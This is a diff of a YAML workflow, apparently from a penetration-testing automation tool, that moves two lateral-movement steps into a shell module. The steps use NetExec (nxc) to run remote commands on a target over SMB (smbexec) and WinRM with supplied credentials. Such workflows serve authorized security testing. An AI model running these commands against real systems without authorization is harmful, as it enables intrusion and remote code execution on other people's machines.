@@ -36,16 +36,20 @@ jobs:
     name: SMB Lateral Movement
     steps:
     - name: nxc-smb
-      run: nxc smb {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
-        }}" --shares --exec-method smbexec -x "whoami && ipconfig" 2>&1 | tee {{ env.OFX_RUN_DIR
-        }}/nxc_smb_lateral.txt
+      module: shell
+      with:
+        cmd: nxc smb {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
+          }}" --shares --exec-method smbexec -x "whoami && ipconfig" 2>&1 | tee {{ env.OFX_RUN_DIR
+          }}/nxc_smb_lateral.txt
       continue-on-error: true
       log-command: '{{ inputs.log_command }}'
   winrm-move:
     name: WinRM Lateral Movement
     steps:
     - name: nxc-winrm
-      run: nxc winrm {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
-        }}" -x "whoami" 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_winrm_lateral.txt
+      module: shell
+      with:
+        cmd: nxc winrm {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
+          }}" -x "whoami" 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_winrm_lateral.txt
       continue-on-error: true
       log-command: '{{ inputs.log_command }}'
